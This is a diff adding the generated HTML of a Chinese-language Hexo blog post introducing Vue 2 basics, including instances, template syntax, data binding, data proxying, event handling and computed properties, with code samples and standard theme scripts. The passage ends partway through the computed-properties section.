@@ -1,0 +1,1107 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>VueJS - Vue2 Basic | myBlog</title><meta name="keywords" content="VueJS"><meta name="author" content="Donald Lam,manholam8@gmail.com"><meta name="copyright" content="Donald Lam"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Vue2 BasicVue簡介 Vue是一套用於建構用戶介面的漸進式JavaScript框架（ie. 將數據變成用戶可視的界面）  Vue的特點：  採用組件化模式，提高代碼複用率和更好維護 在一個 .vue 裏面就是一個組件，包含 html&#x2F;css&#x2F;js 聲明式編碼，無需直接操作DOM，提高開發效率 聲明式編碼 vs 命令式編碼 命令式編碼：清楚列明每一個操作步驟  聲明式編碼：用語法直接讓Re">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VueJS - Vue2 Basic">
+<meta property="og:url" content="https://github.com/DonaldLamNL/myBlog/2022/06/08/WebsiteDevelopment/VueJS/2022-6-8-Vue2JS-Basic/index.html">
+<meta property="og:site_name" content="myBlog">
+<meta property="og:description" content="Vue2 BasicVue簡介 Vue是一套用於建構用戶介面的漸進式JavaScript框架（ie. 將數據變成用戶可視的界面）  Vue的特點：  採用組件化模式，提高代碼複用率和更好維護 在一個 .vue 裏面就是一個組件，包含 html&#x2F;css&#x2F;js 聲明式編碼，無需直接操作DOM，提高開發效率 聲明式編碼 vs 命令式編碼 命令式編碼：清楚列明每一個操作步驟  聲明式編碼：用語法直接讓Re">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://p.ipic.vip/6a7ugr.webp">
+<meta property="article:published_time" content="2022-06-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-09-04T16:00:00.000Z">
+<meta property="article:author" content="Donald Lam">
+<meta property="article:tag" content="VueJS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p.ipic.vip/6a7ugr.webp"><link rel="shortcut icon" href="/myBlog/img/favicon.png"><link rel="canonical" href="https://github.com/DonaldLamNL/myBlog/2022/06/08/WebsiteDevelopment/VueJS/2022-6-8-Vue2JS-Basic/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/myBlog/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/myBlog/',
+  algolia: undefined,
+  localSearch: {"path":"/myBlog/search.xml","preload":true,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'VueJS - Vue2 Basic',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-09-05 00:00:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://p.ipic.vip/5dc8z2.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/myBlog/archives/"><div class="headline">Articles</div><div class="length-num">64</div></a><a href="/myBlog/tags/"><div class="headline">Tags</div><div class="length-num">13</div></a><a href="/myBlog/categories/"><div class="headline">Categories</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/myBlog/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/myBlog/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/myBlog/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/myBlog/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://p.ipic.vip/6a7ugr.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/myBlog/">myBlog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/myBlog/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/myBlog/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/myBlog/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/myBlog/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">VueJS - Vue2 Basic</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-06-07T16:00:00.000Z" title="Created 2022-06-08 00:00:00">2022-06-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-09-04T16:00:00.000Z" title="Updated 2022-09-05 00:00:00">2022-09-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/myBlog/categories/Web-FrontEnd/">Web FrontEnd</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="VueJS - Vue2 Basic"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Vue2-Basic"><a href="#Vue2-Basic" class="headerlink" title="Vue2 Basic"></a>Vue2 Basic</h1><h2 id="Vue簡介"><a href="#Vue簡介" class="headerlink" title="Vue簡介"></a>Vue簡介</h2><ul>
+<li><p>Vue是一套用於建構用戶介面的漸進式JavaScript框架（ie. 將數據變成用戶可視的界面）</p>
+</li>
+<li><p>Vue的特點：</p>
+<ol>
+<li>採用組件化模式，提高代碼複用率和更好維護<br> 在一個 .vue 裏面就是一個組件，包含 html/css/js</li>
+<li>聲明式編碼，無需直接操作DOM，提高開發效率<br> 聲明式編碼 vs 命令式編碼<pre><code> 命令式編碼：清楚列明每一個操作步驟
+ 聲明式編碼：用語法直接讓React佢操作DOM
+</code></pre></li>
+<li>使用虛擬DOM + 優秀的Diff算法，儘量複用DOM節點</li>
+</ol>
+</li>
+</ul>
+<h2 id="Vue操作"><a href="#Vue操作" class="headerlink" title="Vue操作"></a>Vue操作</h2><ul>
+<li>Vue操作：<ol>
+<li>想讓Vue工作，就必須創建一個Vue實例，且要傳入一個配置對象</li>
+<li>root容器中的代碼依然符合html規範，只不過混入了一些特殊的Vue語法</li>
+<li>root容器中的代碼被稱為 “Vue模板”</li>
+<li>Vue實例和容器是<font color="#f54747">一對一</font>的</li>
+<li>真實開發中有一個Vue實例，並且會配合著組件一起使用</li>
+<li><code>&#123;&#123;xxx&#125;&#125;</code>中的<code>xxx</code>要寫JS表達式，且<code>xxx</code>可以自動讀取<code>data</code>中的所有屬性</li>
+<li>一旦data中的數據發生改變，那麼頁面中用到該數據的地方也會自動更新</li>
+</ol>
+</li>
+</ul>
+<ul>
+<li>具體代碼：  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../vue_basic/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 準備一個容器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;&#123;name&#125;&#125;, &#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 創建Vue實例</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#demo&#x27;</span>,      <span class="comment">// element 用於指定當前Vue實例為哪個容器服務，值通常為css選擇棄字符串</span></span><br><span class="line">    <span class="attr">data</span>:&#123; <span class="comment">// data中用於存儲數據，數據共el所指定的容器去使用，值暫時先寫成一個對象</span></span><br><span class="line">        <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>,</span><br><span class="line">        <span class="attr">gender</span>: <span class="string">&#x27;M&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li>注意區分：<font color="#f54747">JS表達式</font> 和 <font color="#f54747">JS代碼/語句</font><ul>
+<li>JS表達式：一個表達式會生成一個值，可以放在任何一個地方<ol>
+<li><code>a</code></li>
+<li><code>a+b</code></li>
+<li><code>demo(1)</code></li>
+<li><code>x === y ? &#39;a&#39; : &#39;b&#39;</code></li>
+</ol>
+</li>
+<li>JS語句：<ol>
+<li><code>if()&#123;&#125;</code></li>
+<li><code>for()&#123;&#125;</code></li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="模塊語法"><a href="#模塊語法" class="headerlink" title="模塊語法"></a>模塊語法</h2><ol>
+<li>插值語法：<br> 功能：用於解析標籤體的內容<br> 寫法：<code>&#123;&#123;xxx&#125;&#125;</code>, <code>xxx</code>是JS表達式，且可以直接讀取到<code>data</code>中的所有屬性 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h3&gt;Hello, &#123;&#123;name&#125;&#125;&lt;/h3&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li>指令語法：<br> 功能：用於解析標籤 (包括：標籤屬性、標籤體內容、綁定時間…)<br> 舉例：<code>v-bind:href=&quot;xxx&quot;</code> 或 簡寫為 <code>:href=&quot;xxx&quot;</code>, <code>xxx</code>同為JS表達式，且可以直接讀取到<code>data</code>中的所有屬性<br> 備註：Vue中有很多的指令，且形式都是: <code>v-yyy</code> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a v-bind:href=&quot;link.url&quot; x=&quot;hello&quot;&gt;Go To &#123;&#123;link.name&#125;&#125;&lt;/a&gt;</span><br><span class="line">&lt;a :href=&quot;link.url&quot; x=&quot;hello&quot;&gt;Go To &#123;&#123;link.name&#125;&#125; 2&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ul>
+<li>Vue實例  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&#x27;#demo&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>:&#123;</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>,</span><br><span class="line">        <span class="attr">link</span>:&#123;</span><br><span class="line">            <span class="attr">name</span>:<span class="string">&#x27;Google&#x27;</span>,</span><br><span class="line">            <span class="attr">url</span>:<span class="string">&#x27;http://www.google.com&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="數據綁定"><a href="#數據綁定" class="headerlink" title="數據綁定"></a>數據綁定</h2><ol>
+<li>單向數據綁定(<code>v-bind</code>)：數據只能從<code>data</code>流向頁面 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 全寫 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-bind:value=&quot;name&quot;&gt;</span><br><span class="line">&lt;!-- 簡寫 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; :value=&quot;name&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li>雙向數據綁定(<code>v-model</code>)：數據不僅能從data流向頁面，還可以從頁面留向<code>data</code><ul>
+<li>雙向綁定一般都應用在表單類元素上 (如：<code>input</code>、<code>select</code>等)</li>
+<li><code>v-model:value</code>可以簡寫為<code>v-model</code>，因為<code>v-model</code>默認收集的就是<code>value</code>值<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 全寫 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-model:value=&quot;name&quot;&gt;</span><br><span class="line">&lt;!-- 簡寫 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-model=&quot;name&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="el和data寫法"><a href="#el和data寫法" class="headerlink" title="el和data寫法"></a>el和data寫法</h2><ol>
+<li><code>el</code>的兩種寫法：<ol>
+<li><code>new Vue</code>時配置<code>el</code>的屬性</li>
+<li>先創建Vue實例，隨後再通過 <code>vm.$mount(&#39;#root&#39;)</code>指定<code>el</code>的值</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li><p><code>data</code>的兩種寫法：</p>
+<ol>
+<li><p>對象式</p>
+ <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>:&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>函數式<font color="#f54747">（推薦使用，因為後續會報錯）</font><br> 備註：由Vue管理的函數，<font color="#f54747">一定不要寫箭頭函數</font>，一旦寫了箭頭函數，<code>this</code>就不再是Vue實例了</p>
+ <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>&#123;</span><br><span class="line">        <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="MVVM模型"><a href="#MVVM模型" class="headerlink" title="MVVM模型"></a>MVVM模型</h2><ol>
+<li>MVVM模型：<br> <img src="https://p.ipic.vip/5hwti8.jpg" width="600px"/><ol>
+<li>M：模型(Model)：對應data中的數據</li>
+<li>V：視圖(View)：模板</li>
+<li>VM：視圖模型(ViewModel)：Vue實例對象<ul>
+<li>而在文檔中經常會使用 <code>vm</code>(ViewModel) 這個變量名來表示Vue實例</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li>觀察發現：<ol>
+<li><code>data</code>中所有的屬性，最後都出現在<code>vm</code>身上</li>
+<li><code>vm</code>身上的所有屬性 及 Vue原型上的所有屬性，在Vue模板中都可以直接使用</li>
+</ol>
+</li>
+</ol>
+<h2 id="數據代理"><a href="#數據代理" class="headerlink" title="數據代理"></a>數據代理</h2><ol>
+<li><code>defineProperty</code>方法 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person, <span class="string">&#x27;age&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">value</span>:<span class="number">18</span>,</span><br><span class="line">    <span class="attr">enumerable</span>:<span class="literal">true</span>,       <span class="comment">// 控制屬性是否可以枚舉，默認值為false</span></span><br><span class="line">    <span class="attr">writable</span>:<span class="literal">true</span>,         <span class="comment">// 控制屬性是否可以被修改，默認值為false</span></span><br><span class="line">    <span class="attr">configurable</span>:<span class="literal">true</span>,     <span class="comment">// 控制屬性是否可以被刪除，默認值為false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 當有人讀取person的age屬性時，get函數(getter)就會被調用，且返回值就是age的值</span></span><br><span class="line">    <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> number</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 當有人修改person的age屬性時，set函數(setter)就會被調用，且會收到修改的具體值</span></span><br><span class="line">    <span class="title function_">set</span>(<span class="params">value</span>)&#123;</span><br><span class="line">        number = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li><p>數據代理</p>
+<ol>
+<li><p>Vue中的數據代理：</p>
+<ul>
+<li>通過<code>vm</code>對象來代理<code>data</code>對象中屬性的操作(讀/寫) (getter/setter)</li>
+</ul>
+</li>
+<li><p>Vue中的數據方法：</p>
+<ul>
+<li>更加方便的操作<code>data</code>中的數據</li>
+</ul>
+</li>
+<li><p>基本原理：</p>
+<ul>
+<li>通過<code>Object.defineProperty()</code>方法把<code>data</code>對象中所有屬性添加到<code>vm</code>上</li>
+<li>為每一個添加到vm的屬性，都指定一個<code>getter</code>和<code>setter</code></li>
+<li>在<code>getter</code>/<code>setter</code>內部去操作(讀/寫)<code>data</code>中響應的屬性</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="事件處理"><a href="#事件處理" class="headerlink" title="事件處理"></a>事件處理</h2><h3 id="事件的基本使用"><a href="#事件的基本使用" class="headerlink" title="事件的基本使用"></a>事件的基本使用</h3><ol>
+<li>使用<code>v-on:xxx</code>或<code>@xxx</code>綁定事件，其中<code>xxx</code>是事件名 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 不傳遞參數 --&gt;</span><br><span class="line">&lt;button @click=&quot;funct&quot;&gt;&lt;/button&gt;</span><br><span class="line">&lt;!-- 傳遞參數 --&gt;</span><br><span class="line">&lt;button @click=&quot;funct(parameters)&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li>事件的回調需要配置在<code>methods</code>對象中，最終會在<code>vm</code>上 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">    <span class="title function_">funct</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li><p><code>methods</code>中配置的函數，<font color="#f54747">不要用箭頭函數</font>，否則this就不是vm了</p>
+</li>
+<li><p><code>methods</code>中配置的函數，都是被Vue所管理的函數，<code>this</code>的指向是<code>vm</code>或組件實例對象</p>
+</li>
+<li><p><code>@click=&quot;demo&quot;</code>和<code>@click=&quot;demo($event)&quot;</code>效果一致，但後者可以傳参</p>
+</li>
+</ol>
+<h3 id="事件修飾符"><a href="#事件修飾符" class="headerlink" title="事件修飾符"></a>事件修飾符</h3><ol>
+<li><code>prevent</code>：阻止默認事件</li>
+<li><code>stop</code>：阻止事件冒泡</li>
+<li><code>once</code>：事件只出發一次</li>
+<li><code>capture</code>：使用事件的捕獲模式</li>
+<li><code>self</code>：只有<code>event.target</code>是當前操作的元素時才觸法事件</li>
+<li><code>passive</code>：事件的默認行為立即執行，無需等到事件回調執行完畢 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button @click.xxx=&quot;funct(parameters)&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+ 備註：修飾符可以連續寫，例如<code>@click.prevent.stop</code>先阻止默認事件，再阻止冒泡</li>
+</ol>
+<h3 id="鍵盤事件"><a href="#鍵盤事件" class="headerlink" title="鍵盤事件"></a>鍵盤事件</h3><ol>
+<li>Vue中常用的按鍵別名：<br> <code>enter</code>、<code>delete</code>、<code>esc</code>、<code>space</code>、<code>tab</code> (特殊，必須配合keydown去使用)、<code>up</code>、<code>down</code>、<code>left</code>、<code>right</code> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; @keyup.enter=&quot;funct&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol>
+<li>Vue未提供別名的按鍵，可以使用按鍵原始的key值去綁定，但注意要轉為<code>kebab-case</code>(短橫線命名)</li>
+</ol>
+<ol>
+<li>系統修飾鍵（用法特殊）：<code>ctrl</code>、<code>alt</code>、<code>shift</code>、<code>meta</code><ul>
+<li>配合<code>keyup</code>使用：按下修飾鍵的同時，再按下其他鍵，隨後釋放其他鍵，事件才會觸發</li>
+<li>配合<code>keydown</code>使用：正常觸發事件  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; @keyup.ctrl.y=&quot;funct&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li>也可以使用<code>keyCode</code>去指定具體的按鍵（不推薦）</li>
+</ol>
+<ol>
+<li><code>Vue.config.keyCodes.自定義鍵名 = 鍵碼</code>，可以去定製按鍵別名</li>
+</ol>
+<h2 id="計算屬性"><a href="#計算屬性" class="headerlink" title="計算屬性"></a>計算屬性</h2><ol>
+<li>定義：要用的屬性不存在，要通過「已有的屬性 (並非已有的隨便一個變量)」計算得來</li>
+</ol>
+<ol>
+<li>原理：底層借助了<code>Object.defineProperty</code>方法提供的<code>getter</code>和<code>setter</code></li>
+</ol>
+<ol>
+<li><code>get</code>函數的執行時間：<ul>
+<li>初次讀取時會執行一次</li>
+<li>當依賴的數據發生改變時會被再次調用</li>
+</ul>
+</li>
+</ol>
+<ol>
+<li>優勢：與<code>methods</code>實現相比，內部有緩存機制(複用)，效率更高，調試方便</li>
+</ol>
+<ol>
+<li>備註：<ol>
+<li>計算屬性最終會出現在<code>vm</code>上，可直接讀取使用</li>
+<li>如果計算屬性要被修改，那必須寫<code>set</code>函數去響應修改，且<code>set</code>中要引起計算時依賴的數據發生</li>
+<li>如果只考慮讀取、不考慮改寫，可以使用簡寫方法，但因為是計算屬性不是<code>method</code>，因此不要加()</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li>具體代碼： <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">    <span class="comment">// 完整寫法：</span></span><br><span class="line">    <span class="attr">fullName</span>:&#123;</span><br><span class="line">        <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span>     <span class="comment">// 被調用的屬性即是依賴的屬性</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">set</span>(<span class="params">value</span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> arr = value.<span class="title function_">split</span>(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">firstName</span> = arr[<span class="number">0</span>];</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">lastName</span> = arr[<span class="number">1</span>];</span><br><span class="line">        &#125;                    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 簡寫</span></span><br><span class="line">    <span class="title function_">fullName</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
